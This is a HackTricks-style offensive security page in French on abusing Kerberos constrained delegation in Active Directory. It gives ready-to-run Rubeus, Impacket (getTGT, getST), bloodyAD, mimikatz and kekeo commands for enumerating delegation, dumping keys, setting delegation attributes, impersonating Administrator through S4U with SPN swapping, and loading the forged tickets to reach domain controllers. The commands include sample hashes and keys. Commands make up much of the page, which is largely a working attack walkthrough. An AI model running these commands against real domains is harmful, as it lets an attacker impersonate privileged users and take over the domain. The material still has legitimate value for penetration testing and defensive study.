# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Grâce à cela, un administrateur de domaine peut **autoriser** un ordinateur à **usurper l'identité d'un utilisateur ou d'un ordinateur** auprès de n'importe quel **service** d'une machine.

- **Service for User to self (_S4U2self_):** Si un **compte de service** a une valeur _userAccountControl_ contenant [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), alors il peut obtenir un TGS pour lui-même (le service) au nom de n'importe quel autre utilisateur.
- **Service for User to Proxy(_S4U2proxy_):** Un **compte de service** peut obtenir un TGS au nom de n'importe quel utilisateur pour le service défini dans **msDS-AllowedToDelegateTo.** Pour ce faire, il a d'abord besoin d'un TGS de cet utilisateur vers lui-même, mais il peut utiliser S4U2self pour obtenir ce TGS avant de demander l'autre.

**Note** : Si un utilisateur est marqué comme ‘_Account is sensitive and cannot be delegated_’ dans AD, vous ne pourrez **pas l'usurper**.

Cela signifie que si vous compromettez le hash du service, vous pouvez usurper des utilisateurs et obtenir un accès en leur nom à n'importe quel service sur les machines indiquées (privesc possible).

De plus, vous n'aurez pas seulement accès au service que l'utilisateur peut usurper, mais aussi à n'importe quel service, car le SPN (le nom du service demandé) n'est pas vérifié (dans le ticket cette partie n'est pas chiffrée/signée). Par conséquent, si vous avez accès au service CIFS vous pouvez aussi accéder au service HOST en utilisant l'option /altservice dans Rubeus par exemple. La même faiblesse de permutation de SPN est exploitée par Impacket getST -altservice et d'autres outils.

De plus, l'accès au service LDAP sur le DC est nécessaire pour exploiter un DCSync.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

Depuis **Windows Server 2012/2012 R2**, le **KDC** prend en charge la **constrained delegation** across domains/forests via les extensions **S4U2Proxy**. Les builds modernes (Windows Server 2016–2025) conservent ce comportement et ajoutent deux PAC SIDs pour signaler la transition de protocole :

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) lorsque l'utilisateur s'est authentifié normalement.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) lorsqu'un service a asserté l'identité via la protocol transition.

Attendez-vous à trouver `SERVICE_ASSERTED_IDENTITY` dans le PAC lorsque la protocol transition est utilisée across domains, ce qui confirme que l'étape S4U2Proxy a réussi.

### Impacket / Linux tooling (altservice & full S4U)

Les versions récentes d'Impacket (0.11.x+) exposent la même chaîne S4U et le même SPN swapping que Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).

### Automatisation de la configuration de délégation depuis des low-priv creds

Si vous disposez déjà de **GenericAll/WriteDACL** sur un compte d'ordinateur ou de service, vous pouvez pousser les attributs requis à distance sans RSAT en utilisant **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Cela vous permet de construire un constrained delegation path pour privesc sans privilèges DA dès que vous pouvez écrire ces attributs.

- Étape 1 : **Obtenir le TGT du service autorisé**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Il existe **d'autres façons d'obtenir un TGT ticket** ou le **RC4** ou **AES256** sans être SYSTEM sur l'ordinateur, comme le Printer Bug, l'unconstrain delegation, le NTLM relaying et l'abus d'Active Directory Certificate Service
>
> **Le simple fait de posséder ce TGT ticket (ou son hash) vous permet d'effectuer cette attaque sans compromettre l'ensemble de l'ordinateur.**

- Étape 2 : **Obtenir un TGS pour le service en usurpant l'utilisateur**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Plus d'informations sur ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) et [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Références
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
